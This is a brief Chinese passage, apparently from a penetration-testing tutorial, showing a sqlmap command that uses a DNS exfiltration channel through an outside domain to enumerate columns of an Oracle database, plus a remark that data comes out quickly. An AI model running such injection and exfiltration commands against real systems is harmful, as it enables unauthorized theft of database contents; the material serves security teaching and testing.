## 0x03 使用sqlmap --dns-domain快速注入

使用以下命令获取表名

```
 python sqlmap.py -r 2.txt --dbms=oracle --dns-domain=cwkiller.top -D app --columns --batch
```

![](../Images/e9fbbc2c44863eb975905e2de51b01b0.png)

选中部分代表DNS通道建立成功，可以看到一秒钟能跑多条数据.
